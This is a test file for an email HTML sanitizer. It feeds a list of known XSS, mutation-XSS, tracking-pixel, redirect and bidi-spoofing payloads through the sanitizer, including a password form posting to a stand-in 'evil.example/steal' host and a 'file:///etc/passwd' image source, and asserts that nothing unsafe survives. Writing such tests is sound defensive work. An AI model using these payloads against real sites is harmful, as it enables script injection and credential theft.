import { describe, expect, it } from "bun:test";

import { assertSafeOutput } from "../test-support/assert-safe";
import {
	MAX_DEPTH,
	MAX_ELEMENTS,
	MAX_INPUT_LENGTH,
	MAX_NESTING,
	sanitizeHtml,
} from ".";

const BLOCK = { remoteImages: false };
const LOAD = { remoteImages: true };

/** Real payloads, each of a kind that has run script or tracked a reader in some mail client. */
const HOSTILE: Record<string, string> = {
	script: "<p>hi</p><script>alert(document.cookie)</script>",
	svgOnload: '<svg onload="alert(1)"><circle r="5"/></svg><p>after</p>',
	svgStyleImg: "<svg><style><img src=x onerror=alert(1)></style></svg>",
	cssUrl: '<div style="background:url(https://track.example/p.gif)">x</div><style>body{background:url(https://track.example/q.gif)}</style>',
	metaRefresh:
		'<meta http-equiv="refresh" content="0;url=https://evil.example/"><p>x</p>',
	baseHref: '<base href="https://evil.example/"><a href="/login">log in</a>',
	javascriptLink: '<a href="javascript:alert(1)">click</a>',
	javascriptTabbed: '<a href="java\tscript:alert(1)">click</a>',
	javascriptEntity: '<a href="&#106;avascript:alert(1)">click</a>',
	javascriptCase: '<a href="JaVaScRiPt:alert(1)">click</a>',
	dataLink:
		'<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">x</a>',
	vbscript: '<a href="vbscript:msgbox(1)">x</a>',
	onerror: '<img src="x" onerror="alert(1)">',
	onclick: '<p onclick="alert(1)" onmouseover="alert(2)">x</p>',
	iframe: '<iframe src="https://evil.example/"></iframe><iframe srcdoc="<script>alert(1)</script>"></iframe>',
	objectEmbed:
		'<object data="x.swf"></object><embed src="x.swf"><applet code="x"></applet>',
	form: '<form action="https://evil.example/steal"><input name="pw" type="password"><button>go</button></form>',
	formaction: '<button formaction="https://evil.example/">go</button>',
	mxssSvgMath:
		'<math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;img src=1 onerror=alert(1)&gt;">',
	mxssNoscript:
		'<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
	mxssForm:
		"<form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)>",
	mxssTemplate: "<template><script>alert(1)</script></template>",
	mxssTextarea: "<textarea><img src=x onerror=alert(1)></textarea>",
	mxssTitle: "<title><img src=x onerror=alert(1)></title>",
	mxssXmp: "<xmp><img src=x onerror=alert(1)></xmp>",
	mxssSelect:
		"<select><template><style><img src=x onerror=alert(1)></style></template></select>",
	mxssComment: "<!--><img src=x onerror=alert(1)>-->",
	mxssCdata: "<![CDATA[<img src=x onerror=alert(1)>]]>",
	trackerPixel:
		'<img src="https://track.example/p.gif?u=1" width="1" height="1">',
	srcset: '<img srcset="https://track.example/a.gif 1x" src="x">',
	background:
		'<table background="https://track.example/b.gif"><tr><td background="https://track.example/c.gif">x</td></tr></table>',
	linkRel:
		'<link rel="stylesheet" href="https://track.example/s.css"><p>x</p>',
	svgUse: '<svg><use href="data:image/svg+xml;base64,PHN2Zz4="/></svg>',
	imageTag: '<image src="https://track.example/i.gif">',
	video: '<video src="https://track.example/v.mp4" poster="https://track.example/p.png"></video>',
	idClobber: '<a id="x" name="y" class="z" href="https://example.org/">x</a>',
	nullByte: "<scr\u0000ipt>alert(1)</scr\u0000ipt>",
	bidiText: "<p>‮gnp.exe‬ and ⁦isolate⁩</p>",
};

describe("sanitizeHtml: hostile payloads", () => {
	for (const [name, payload] of Object.entries(HOSTILE)) {
		it(`${name}: nothing outside the allow-list survives, remote images blocked or loaded`, () => {
			for (const options of [BLOCK, LOAD]) {
				const { html } = sanitizeHtml(payload, options);
				assertSafeOutput(html);
				expect(html).not.toMatch(
					/<script|<svg|<math|<style|<iframe|<form|<object|<embed|<base|<meta|<link/iu,
				);
				expect(html).not.toMatch(/\son[a-z]+\s*=/iu);
				expect(html).not.toMatch(/javascript:|vbscript:/iu);
				expect(html).not.toMatch(/[‪-‮⁦-⁩]/u);
			}
		});
	}

	it("keeps the text around a dropped script and drops what is inside it", () => {
		const { html } = sanitizeHtml(HOSTILE["script"] ?? "", BLOCK);
		expect(html).toBe("<p>hi</p>");
	});

	it("drops a link whose target is not http, https, mailto or tel but keeps its text", () => {
		for (const key of [
			"javascriptLink",
			"javascriptTabbed",
			"javascriptEntity",
			"javascriptCase",
			"dataLink",
			"vbscript",
		]) {
			expect(sanitizeHtml(HOSTILE[key] ?? "", BLOCK).html).toMatch(
				/^(?:click|x)$/u,
			);
		}
	});

	it("never emits a style attribute or an event handler whatever the input carries", () => {
		const { html } = sanitizeHtml(HOSTILE["cssUrl"] ?? "", LOAD);
		expect(html).toBe("<div>x</div>");
		expect(sanitizeHtml(HOSTILE["onclick"] ?? "", BLOCK).html).toBe(
			"<p>x</p>",
		);
	});

	it("does not carry a meta refresh, a base or a stylesheet link into the output", () => {
		expect(sanitizeHtml(HOSTILE["metaRefresh"] ?? "", BLOCK).html).toBe(
			"<p>x</p>",
		);
		expect(sanitizeHtml(HOSTILE["baseHref"] ?? "", BLOCK).html).toBe(
			"log in",
		);
		expect(sanitizeHtml(HOSTILE["linkRel"] ?? "", BLOCK).html).toBe(
			"<p>x</p>",
		);
	});

	it("treats a form as nothing and keeps no control of it", () => {
		expect(sanitizeHtml(HOSTILE["form"] ?? "", BLOCK).html).toBe("");
		expect(sanitizeHtml(HOSTILE["formaction"] ?? "", BLOCK).html).toBe("");
	});

	it("removes the bidi controls from text", () => {
		expect(sanitizeHtml(HOSTILE["bidiText"] ?? "", BLOCK).html).toBe(
			"<p>gnp.exe and isolate</p>",
		);
	});

	it("drops the null bytes that hide a tag name", () => {
		const { html } = sanitizeHtml(HOSTILE["nullByte"] ?? "", BLOCK);
		assertSafeOutput(html);
		expect(html).not.toMatch(/script/iu);
	});
});

describe("sanitizeHtml: links", () => {
	it("keeps http, https, mailto and tel targets and forces a new window without opener or referrer", () => {
		const { html } = sanitizeHtml(
			'<a href="https://example.org/a?b=1&amp;c=2">a</a><a href="mailto:x@example.org">m</a><a href="tel:+123">t</a>',
			BLOCK,
		);
		expect(html).toContain('href="https://example.org/a?b=1&amp;c=2"');
		expect(html).toContain('href="mailto:x@example.org"');
		expect(html).toContain('href="tel:+123"');
		expect(
			html.match(/target="_blank" rel="noopener noreferrer nofollow"/gu),
		).toHaveLength(3);
		assertSafeOutput(html);
	});

	it("overrides the target and rel the sender wrote", () => {
		const { html } = sanitizeHtml(
			'<a href="https://example.org/" target="_self" rel="opener">x</a>',
			BLOCK,
		);
		expect(html).toBe(
			'<a href="https://example.org/" target="_blank" rel="noopener noreferrer nofollow">x</a>',
		);
	});

	it("drops a relative link and one that dresses the host with a user name", () => {
		expect(sanitizeHtml('<a href="/login">x</a>', BLOCK).html).toBe("x");
		expect(
			sanitizeHtml(
				'<a href="https://bank.example@evil.example/">x</a>',
				BLOCK,
			).html,
		).toBe("x");
		expect(sanitizeHtml("<a>x</a>", BLOCK).html).toBe("x");
	});

	it("escapes a quote in a target so it cannot end the attribute", () => {
		const { html } = sanitizeHtml(
			'<a href="https://example.org/&quot; onmouseover=&quot;alert(1)">x</a>',
			BLOCK,
		);
		assertSafeOutput(html);
		expect(html).not.toContain(" onmouseover=");
	});
});

describe("sanitizeHtml: images", () => {
	it("blocks a remote image by default, counts it and keeps its description as text", () => {
		const result = sanitizeHtml(
			'<img src="https://track.example/p.gif" alt="logo"><img src="http://track.example/q.gif">',
			BLOCK,
		);
		expect(result.html).toBe("<span>logo</span>");
		expect(result.blockedImages).toBe(2);
	});

	it("loads a remote image only when asked, with no referrer", () => {
		const result = sanitizeHtml(
			'<img src="https://img.example/p.png" alt="a" width="10" height="20">',
			LOAD,
		);
		expect(result.html).toBe(
			'<img src="https://img.example/p.png" alt="a" width="10" height="20" referrerpolicy="no-referrer" loading="lazy">',
		);
		expect(result.blockedImages).toBe(0);
	});

	it("keeps a raster data image and refuses an SVG or HTML one", () => {
		const png = "data:image/png;base64,iVBORw0KGgo=";
		expect(sanitizeHtml(`<img src="${png}">`, BLOCK).html).toContain(png);
		for (const bad of [
			"data:image/svg+xml;base64,PHN2Zz4=",
			"data:text/html;base64,PHA+",
			"javascript:alert(1)",
			"cid:logo",
			"file:///etc/passwd",
			"ftp://x/y.png",
		]) {
			const result = sanitizeHtml(`<img src="${bad}">`, LOAD);
			expect(result.html).toBe("");
			expect(result.blockedImages).toBe(0);
		}
	});
});

describe("sanitizeHtml: structure and limits", () => {
	it("keeps ordinary formatting and tables", () => {
		const input =
			'<table border="1"><tr><td colspan="2" align="center">a</td></tr></table><ul><li>one</li></ul><p dir="rtl" lang="ar">x</p><blockquote>q</blockquote><br><hr>';
		const { html } = sanitizeHtml(input, BLOCK);
		expect(html).toContain('<table border="1">');
		expect(html).toContain('<td colspan="2" align="center">a</td>');
		expect(html).toContain('<p dir="rtl" lang="ar">x</p>');
		expect(html).toContain("<br>");
		assertSafeOutput(html);
	});

	it("unwraps an unknown element and keeps its text", () => {
		expect(
			sanitizeHtml(
				"<blink>old</blink> <font color=red>text</font>",
				BLOCK,
			).html,
		).toBe("old text");
	});

	it("drops an attribute whose value fails its check", () => {
		expect(
			sanitizeHtml(
				'<table><tr><td colspan="2x" align="evil">a</td></tr></table>',
				BLOCK,
			).html,
		).toBe("<table><tbody><tr><td>a</td></tr></tbody></table>");
		expect(
			sanitizeHtml('<p lang="x y" dir="sideways">a</p>', BLOCK).html,
		).toBe("<p>a</p>");
	});

	it("escapes text so it cannot open a tag", () => {
		expect(
			sanitizeHtml("<p>1 &lt; 2 &amp; 3 &gt; 2 &lt;script&gt;</p>", BLOCK)
				.html,
		).toBe("<p>1 &lt; 2 &amp; 3 &gt; 2 &lt;script&gt;</p>");
	});

	it("cuts nesting past the depth limit and says so", () => {
		const deep = `${"<div>".repeat(MAX_DEPTH + 10)}x${"</div>".repeat(MAX_DEPTH + 10)}`;
		const result = sanitizeHtml(deep, BLOCK);
		expect(result.truncated).toBe(true);
		expect(result.html.match(/<div>/gu)).toHaveLength(MAX_DEPTH);
	});

	it("survives a hundred thousand nested elements", () => {
		const result = sanitizeHtml("<div>".repeat(100_000), BLOCK);
		expect(result.truncated).toBe(true);
	});

	it("survives deep nesting of elements it unwraps rather than writes", () => {
		for (const open of [
			"<x>",
			"<font>",
			'<a href="javascript:x">',
			"<center>",
		]) {
			const result = sanitizeHtml(`${open.repeat(100_000)}hi`, BLOCK);
			expect(result.truncated).toBe(true);
		}
	});

	it("keeps the text of unwrapped elements nested below the written-depth limit", () => {
		const levels = MAX_DEPTH * 3;
		const result = sanitizeHtml(
			`${"<font>".repeat(levels)}deep text${"</font>".repeat(levels)}`,
			BLOCK,
		);
		expect(levels).toBeLessThan(MAX_NESTING);
		expect(result.truncated).toBe(false);
		expect(result.html).toBe("deep text");
	});

	it("cuts a body with more elements than the limit", () => {
		const result = sanitizeHtml("<b>x</b>".repeat(MAX_ELEMENTS + 5), BLOCK);
		expect(result.truncated).toBe(true);
		expect(result.html.match(/<b>/gu)).toHaveLength(MAX_ELEMENTS);
	});

	it("reads at most the input limit and says so", () => {
		const result = sanitizeHtml(
			`<p>${"a".repeat(MAX_INPUT_LENGTH)}</p>`,
			BLOCK,
		);
		expect(result.truncated).toBe(true);
		expect(result.html.length).toBeLessThanOrEqual(MAX_INPUT_LENGTH + 20);
	});

	it("returns nothing for an empty or text-only input", () => {
		expect(sanitizeHtml("", BLOCK)).toEqual({
			html: "",
			blockedImages: 0,
			truncated: false,
		});
		expect(sanitizeHtml("just text", BLOCK).html).toBe("just text");
	});
});
